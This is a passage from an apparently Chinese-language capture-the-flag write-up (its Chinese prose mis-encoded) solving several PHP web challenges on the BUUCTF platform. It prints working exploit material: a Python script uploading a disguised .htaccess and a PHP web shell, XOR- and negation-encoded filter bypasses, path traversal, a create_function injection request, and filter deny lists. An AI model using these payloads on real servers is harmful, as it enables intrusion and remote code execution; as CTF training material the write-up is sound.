</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_FILES[<span style=color:#e6db74>&#34;file&#34;</span>])){
</span></span><span style=display:flex><span>        $tmp_name <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#34;file&#34;</span>][<span style=color:#e6db74>&#34;tmp_name&#34;</span>];
</span></span><span style=display:flex><span>        $name <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#34;file&#34;</span>][<span style=color:#e6db74>&#34;name&#34;</span>];
</span></span><span style=display:flex><span>        $extension <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($name, <span style=color:#a6e22e>strrpos</span>($name,<span style=color:#e6db74>&#34;.&#34;</span>)<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/ph/i&#34;</span>,$extension)) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;^_^&#34;</span>); 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>mb_strpos</span>(<span style=color:#a6e22e>file_get_contents</span>($tmp_name), <span style=color:#e6db74>&#39;&lt;?&#39;</span>)<span style=color:#f92672>!==</span><span style=color:#66d9ef>False</span>) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;^_^&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>exif_imagetype</span>($tmp_name)) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;^_^&#34;</span>); 
</span></span><span style=display:flex><span>        $path<span style=color:#f92672>=</span> $userdir<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>.</span>$name;
</span></span><span style=display:flex><span>        <span style=color:#f92672>@</span><span style=color:#a6e22e>move_uploaded_file</span>($tmp_name, $path);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>print_r</span>($path);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$hhh <span style=color:#f92672>=</span> <span style=color:#f92672>@</span>$_GET[<span style=color:#e6db74>&#39;_&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$hhh){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($hhh)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>18</span>){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;One inch long, one inch strong!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[\x00- 0-9A-Za-z\&#39;&#34;\`~_&amp;.,|=[\x7F]+/i&#39;</span>, $hhh) )
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;Try something else!&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$character_type <span style=color:#f92672>=</span> <span style=color:#a6e22e>count_chars</span>($hhh, <span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($character_type)<span style=color:#f92672>&gt;</span><span style=color:#ae81ff>12</span>) <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Almost there!&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>eval</span>($hhh);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>å…ˆçœ‹ä¸‹é¢çš„åˆ©ç”¨æ˜¯ä¸€ä¸ªæ— å­—ç¬¦ç»•è¿‡,ç”±äºé™åˆ¶äº†é•¿åº¦ï¼Œå¯ä»¥å…ˆæ„é€ ä¸€ä¸ª<code>$_GET[]()</code>æ­¤å¤„<code>[]</code>è¢«è¿‡æ»¤å¯ä»¥é‡‡ç”¨<code>{}</code>æ¥æ›¿ä»£ä¹Ÿæ˜¯ä¸€æ ·çš„</p><pre tabindex=0><code>G %86 %c1
E %86 %c3
T %86 %d2
_ %86 %d9
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?_<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>%86%86%86%86^%d9%c1%c3%d2<span style=color:#e6db74>}</span><span style=color:#f92672>{</span>%86<span style=color:#f92672>}()</span>;&amp;%86<span style=color:#f92672>=</span>phpinfo
</span></span></code></pre></div><h3 id=éé¢„æœŸç¯å¢ƒåŸå› >éé¢„æœŸ(ç¯å¢ƒåŸå› )</h3><p>ç”±äºcount_charsçš„é™åˆ¶éœ€è¦å°½é‡ä¿æŒä¸€è‡´ï¼Œç„¶åå°±æ˜¯ç”¨å¼‚æˆ–çš„æ–¹æ³•æ„é€ ï¼Œå¯ä»¥æœåˆ°flag</p><h3 id=é¢„æœŸ-1>é¢„æœŸ</h3><p>çœ‹ä¸Šé¢çš„å†…å®¹ï¼Œè¿‡æ»¤äº†phå’Œ<code>&lt;?</code>æ¯”è¾ƒæ­»ï¼Œéœ€è¦ä¼ é©¬ï¼Œè€ƒè™‘åˆ°ç¯å¢ƒæ˜¯apacheæœåŠ¡å™¨ï¼Œé‡‡ç”¨<code>.htaccess</code>ï¼Œ</p><p><code>exif_imagetype</code>æ£€æµ‹ <code>$tmp_name</code> æ‰€æŒ‡å‘çš„æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„å›¾ç‰‡,å¦‚ä½•è®©htaccessè¢«è¯†åˆ«ä¸ºå›¾ç‰‡æœ‰ä¸¤ç§æ–¹æ³•</p><p>æ–‡ä»¶å¼€å¤´åŠ </p><pre tabindex=0><code class=language-htaccess data-lang=htaccess>#define width 1337
#define height 1337
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>åœ¨.htaccesså‰æ·»åŠ x00x00x8ax39x8ax39(è¦åœ¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ä¸­æ·»åŠ ï¼Œæˆ–è€…ä½¿ç”¨pythonçš„bytesç±»å‹)
</span></span><span style=display:flex><span>x00x00x8ax39x8ax39 æ˜¯wbmpæ–‡ä»¶çš„æ–‡ä»¶å¤´
</span></span><span style=display:flex><span>.htaccessä¸­ä»¥0x00å¼€å¤´çš„åŒæ ·ä¹Ÿæ˜¯æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šå½±å“.htaccess
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>htaccess <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#define width 1337
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#define height 1337 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>AddType application/x-httpd-php .orange
</span></span></span><span style=display:flex><span><span style=color:#e6db74>php_value auto_append_file &#34;php://filter/convert.base64-decode/resource=./shell.orange&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>shell <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;GIF89a12&#34;</span> <span style=color:#f92672>+</span> base64<span style=color:#f92672>.</span>b64encode(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&#34;</span>)
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://067a6d51-273e-48c0-b717-bbe9c9fdeea8.node5.buuoj.cn:81/?_=${</span><span style=color:#e6db74>%86%</span><span style=color:#e6db74>86</span><span style=color:#e6db74>%86%</span><span style=color:#e6db74>86^</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>9</span><span style=color:#e6db74>%c</span><span style=color:#e6db74>1</span><span style=color:#e6db74>%c</span><span style=color:#e6db74>3</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>2}{%86}();&amp;%86=get_the_flag&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;file&#39;</span>:(<span style=color:#e6db74>&#39;.htaccess&#39;</span>,htaccess,<span style=color:#e6db74>&#39;image/jpeg&#39;</span>)}
</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;upload&#34;</span>:<span style=color:#e6db74>&#34;Submit&#34;</span>}
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url, data<span style=color:#f92672>=</span>data, files<span style=color:#f92672>=</span>files)
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;file&#39;</span>:(<span style=color:#e6db74>&#39;shell.orange&#39;</span>,shell,<span style=color:#e6db74>&#39;image/jpeg&#39;</span>)}
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url, data<span style=color:#f92672>=</span>data, files<span style=color:#f92672>=</span>files)
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><p>ç„¶åèšå‰‘è¿æ¥å°±è¡Œäº†ï¼Œdisableå¯ä»¥ç”¨æ’ä»¶ç»•è¿‡</p><h2 id=gkctf-2021easycms>[GKCTF 2021]easycms</h2><p>æ ¹æ®hintå°è¯•ï¼Œåå°ç™»å½•<code>admin::12345</code></p><p>åœ¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://1451649d-20b9-4756-b82d-dba8b58c62cd.node5.buuoj.cn:81/admin.php?m<span style=color:#f92672>=</span>ui&amp;f<span style=color:#f92672>=</span>editTemplate
</span></span></code></pre></div><p>å°è¯•å†™å…¥é©¬ï¼Œå¼¹çª—</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>è¯·åœ¨æœåŠ¡å™¨åˆ›å»º /var/www/html/system/tmp/rcya.txt æ–‡ä»¶ï¼Œå¦‚æœå­˜åœ¨è¯¥æ–‡ä»¶ï¼Œä½¿ç”¨ç¼–è¾‘è½¯ä»¶æ‰“å¼€ï¼Œé‡æ–°ä¿å­˜ä¸€éã€‚
</span></span></code></pre></div><h3 id=é¢„æœŸ-2>é¢„æœŸ</h3><p>çœ‹äº†çœ‹wpï¼Œå¯èƒ½çœŸå®çš„æ¸—é€å°±æ˜¯è¿™æ ·å§ï¼Œè¦æŠŠæ€è·¯æ‰“å¼€</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://1451649d-20b9-4756-b82d-dba8b58c62cd.node5.buuoj.cn:81/admin.php?m<span style=color:#f92672>=</span>wechat&amp;f<span style=color:#f92672>=</span>admin
</span></span></code></pre></div><p>éšä¾¿å°è¯•æ³¨å†Œï¼Œç„¶åä¼šå‘ç°å¯ä»¥ä¸Šä¼ äºŒç»´ç </p><p>çœ‹htmlå¯ä»¥çŸ¥é“åœ°å€ï¼Œè¿›è¡Œä¼ªé€ </p><pre tabindex=0><code>åŸå§‹ID	
../../../system/tmp/rcya.txt/0
</code></pre><p>ç„¶åä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯ï¼Œå†åœ¨ä¹‹å‰çš„åœ°æ–¹ä¸Šä¼ ä¸€æ ·çš„é©¬å°±å¯ä»¥è¿›è¡Œrceäº†ã€‚</p><h3 id=éé¢„æœŸ-1>éé¢„æœŸ</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://1451649d-20b9-4756-b82d-dba8b58c62cd.node5.buuoj.cn:81/admin.php?m<span style=color:#f92672>=</span>site&amp;f<span style=color:#f92672>=</span>setsecurity
</span></span></code></pre></div><p>å¯ä»¥è®¾ç½®å¯†ä¿é—®é¢˜åŠ ä¸€ä¸ªå¯†ä¿é—®é¢˜ï¼Œå†åœ¨ç®¡ç†å‘˜é‡Œé¢åŠ ä¸€ä¸ªç”¨å¯†ä¿éªŒè¯</p><h2 id=bjdctf2020ezphp>[BJDCTF2020]EzPHP</h2><p>å…ˆctrl+uçœ‹æºç </p><pre tabindex=0><code>GFXEIM3YFZYGQ4A=
1nD3x.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>); 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;1nD3x.php&#34;</span>;
</span></span><span style=display:flex><span>$shana <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;shana&#39;</span>];
</span></span><span style=display:flex><span>$passwd <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;passwd&#39;</span>];
</span></span><span style=display:flex><span>$arg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>$code <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_SERVER) { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&#34;|\&#39;|log/i&#39;</span>, $_SERVER[<span style=color:#e6db74>&#39;QUERY_STRING&#39;</span>])
</span></span><span style=display:flex><span>        )  
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;You seem to want to do something bad?&#39;</span>); 
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/http|https/i&#39;</span>, $_GET[<span style=color:#e6db74>&#39;file&#39;</span>])) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^aqua_is_cute$/&#39;</span>, $_GET[<span style=color:#e6db74>&#39;debu&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> $_GET[<span style=color:#e6db74>&#39;debu&#39;</span>] <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;aqua_is_cute&#39;</span>) { 
</span></span><span style=display:flex><span>        $file <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;file&#34;</span>]; 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Neeeeee! Good Job!&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;fxck you! What do you want to do ?!&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_REQUEST) { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span>($_REQUEST <span style=color:#66d9ef>as</span> $value) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[a-zA-Z]/i&#39;</span>, $value))  
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;fxck you! I hate English!&#39;</span>); 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>file_get_contents</span>($file) <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;debu_debu_aqua&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&lt;br&gt;&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>sha1</span>($shana) <span style=color:#f92672>===</span> <span style=color:#a6e22e>sha1</span>($passwd) <span style=color:#f92672>&amp;&amp;</span> $shana <span style=color:#f92672>!=</span> $passwd ){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>extract</span>($_GET[<span style=color:#e6db74>&#34;flag&#34;</span>]);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Very good! you know my password. But what is flag?&lt;br&gt;&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^[a-z0-9]*$/isD&#39;</span>, $code) <span style=color:#f92672>||</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&#34;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;</span>, $arg) ) { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&#34;</span>); 
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#34;flag.php&#34;</span>;
</span></span><span style=display:flex><span>    $code(<span style=color:#e6db74>&#39;&#39;</span>, $arg); 
</span></span><span style=display:flex><span>} <span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?
</span></span></span></code></pre></div><p><code>$_SERVER</code>æ£€æŸ¥ç¼–ç ä¸ä¼šè¿›è¡Œè½¬ç </p><pre tabindex=0><code>?%64ebu=%61qua_is_%63ute%0a
</code></pre><p>ç„¶åä¸‹é¢ä¼šæ£€æŸ¥æŠ¥é”™å­˜åœ¨</p><p><code>$_REQUEST</code>åŒæ—¶æ¥æ”¶<strong>GET</strong>å’Œ<strong>POST</strong>çš„ä¼ å‚ï¼Œä½†<strong>POST</strong>æ‹¥æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œæ‰€ä»¥åªéœ€è¦<strong>POST</strong>ç›¸åŒçš„å‚æ•°å³å¯ç»•è¿‡ã€‚</p><p>ä¼ ä¸€ä¸ª<code>debu=1</code>è¿›è¡Œç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?%64%65%62%75<span style=color:#f92672>=</span>%61%71%75%61%5f%69%73%5f%63%75%74%65%0a
</span></span></code></pre></div><p>ç„¶åå¯¹fileè¿›è¡Œä¼ å€¼ï¼Œè¯•äº†ä¸€ä¸‹base64æ²¡æœ‰ç»•è¿‡å»è¿˜æ˜¯ç”¨urlç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://ea9b460f-80a6-418e-b500-b8b48f8f4e5e.node5.buuoj.cn:81/1nD3x.php?%64%65%62%75<span style=color:#f92672>=</span>%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file<span style=color:#f92672>=</span>data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>debu<span style=color:#f92672>=</span>1&amp;file<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>è¿›è¡Œä¸€ä¸ªç®€å•çš„æ•°ç»„ç»•è¿‡ï¼Œç„¶åå†çœ‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>extract</span>($_GET[<span style=color:#e6db74>&#34;flag&#34;</span>]);
</span></span></code></pre></div><p>è¿™ä¸ªå‡½æ•°å¯ä»¥å°†æ•°ç»„çš„é”®åä½œä¸ºå˜é‡åï¼Œé”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œä»è€ŒåŠ¨æ€ç”Ÿæˆå˜é‡ã€‚</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://ea9b460f-80a6-418e-b500-b8b48f8f4e5e.node5.buuoj.cn:81/1nD3x.php?%64%65%62%75<span style=color:#f92672>=</span>%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file<span style=color:#f92672>=</span>data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61<span style=color:#f92672>[]=</span>1&amp;%70%61%73%73%77%64<span style=color:#f92672>[]=</span>2&amp;%66%6c%61%67<span style=color:#f92672>[</span>%63%6f%64%65<span style=color:#f92672>]=</span>create_function&amp;%66%6c%61%67<span style=color:#f92672>[</span>%61%72%67<span style=color:#f92672>]=}</span>var_dump<span style=color:#f92672>(</span>get_defined_vars<span style=color:#f92672>())</span>;//
</span></span></code></pre></div><pre tabindex=0><code>}var_dump(get_defined_vars());//
</code></pre><p>è¿™ä¸ªæ˜¯ä¸ºäº†æå‰é—­åˆå’Œç»“å°¾ï¼Œåœ¨<code>rea1fl4g.php</code>é‡Œ</p><pre tabindex=0><code>php://filter/convert.base64-encode/resource=rea1fl4g.php
</code></pre><p>ç”±äºincludeè¢«ç¦ç”¨ä½¿ç”¨requireï¼Œç„¶åå†ç”¨å–åç»•è¿‡ä¸Šé¢çš„ä¼ªåè®®</p><p>æœ€åæ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /1nD3x.php?%64%65%62%75<span style=color:#f92672>=</span>%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file<span style=color:#f92672>=</span>data://text/plain,%64%65%62%75_%64%65%62%75_%61%71%75%61&amp;%73%68%61%6e%61<span style=color:#f92672>[]=</span>1&amp;%70%61%73%73%77%64<span style=color:#f92672>[]=</span>2&amp;%66%6c%61%67<span style=color:#f92672>[</span>%63%6f%64%65<span style=color:#f92672>]=</span>create_function&amp;%66%6c%61%67<span style=color:#f92672>[</span>%61%72%67<span style=color:#f92672>]=}</span>require<span style=color:#f92672>((</span>~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F<span style=color:#f92672>))</span>;// HTTP/1.1
</span></span><span style=display:flex><span>Host: ea9b460f-80a6-418e-b500-b8b48f8f4e5e.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>13</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Origin: http://ea9b460f-80a6-418e-b500-b8b48f8f4e5e.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>debu<span style=color:#f92672>=</span>1&amp;file<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span></code></pre></div><p>æœ€åè§£ç å¾—åˆ°flag.</p><h2 id=gyctf2020easythinking>[GYCTF2020]EasyThinking</h2><p><code>www.zip</code>è¯»å–æºç </p><p>éšæ„è¾“å…¥æ˜¯thinkphp6.0</p><p>æ¼æ´ç‚¹æ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>search</span>()
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>Request</span><span style=color:#f92672>::</span><span style=color:#a6e22e>isPost</span>()){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>session</span>(<span style=color:#e6db74>&#39;?UID&#39;</span>))
</span></span><span style=display:flex><span>            {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>redirect</span>(<span style=color:#e6db74>&#39;/home/member/login&#39;</span>);            
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>input</span>(<span style=color:#e6db74>&#34;post.&#34;</span>);
</span></span><span style=display:flex><span>            $record <span style=color:#f92672>=</span> <span style=color:#a6e22e>session</span>(<span style=color:#e6db74>&#34;Record&#34;</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>session</span>(<span style=color:#e6db74>&#34;Record&#34;</span>))
</span></span><span style=display:flex><span>            {
